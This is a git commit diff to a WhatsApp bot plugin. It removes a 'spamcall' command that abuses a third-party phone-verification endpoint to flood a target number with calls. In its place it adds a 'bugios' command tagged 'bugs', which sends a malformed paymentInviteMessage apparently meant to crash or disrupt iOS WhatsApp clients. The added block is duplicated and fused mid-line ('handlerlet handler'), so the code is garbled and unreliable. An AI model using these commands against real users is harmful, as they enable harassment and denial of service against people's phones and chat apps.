5d1dca212b36b637d75239757da5cf3fecd15a40
MFXZ <109869000+MFXZ@users.noreply.github.com>
2022-08-21 14:52:54 +0700

    Update spamcall.js

--- plugins/spamcall.js
+++ plugins/spamcall.js
@@ -1,16 +1,27 @@
-let fetch = require('node-fetch')
-let handler = async (m, { conn, text, usedPrefix }) => {
-  if (!text) throw `Contoh Penggunaan\n${usedPrefix}spamcall 628xxxxxxxx`
-  let nomor = text.replace(/[^0-9]/gi, '').slice(2)
-  if (!nomor.startsWith('8')) throw `Contoh Penggunaan\n${usedPrefix}spamcall 628xxxxxxxx`
-  m.reply('_*Tunggu permintaan anda sedang diproses.....*_')
-  let anu = await fetch(`https://id.jagreward.com/member/verify-mobile/${nomor}`).then(a => a.json())
-  let spcall = `*Nomor bot* : _${anu.phone_prefix}_\n\n_Bot berhasil menlpon anda!_`
-  conn.reply(m.chat, `${spcall}`.trim(), m)
+let handler = async (m, { conn, args, usedPrefix, command }) => {
+   //let kurangtau = 'makjreng'
+conn.relayMessage(m.chat, {
+paymentInviteMessage: {
+expiryTimestamp: 0,
+serviceType: 1
+}}, {})
 }
-handler.help = ['spamcall <nomor>']
-handler.tags = ['tools']
-handler.command = /^(spamcall)$/i
-handler.limit = true
-handler.premium = true
+handler.help = ['bugios']
+handler.tags = ['bugs']
+handler.command = /^(bugios|bugip)$/i
+handler.owner = true
+
+module.exports = handlerlet handler = async (m, { conn, args, usedPrefix, command }) => {
+   //let kurangtau = 'makjreng'
+conn.relayMessage(m.chat, {
+paymentInviteMessage: {
+expiryTimestamp: 0,
+serviceType: 1
+}}, {})
+}
+handler.help = ['bugios']
+handler.tags = ['bugs']
+handler.command = /^(bugios|bugip)$/i
+handler.owner = true
+
 module.exports = handler
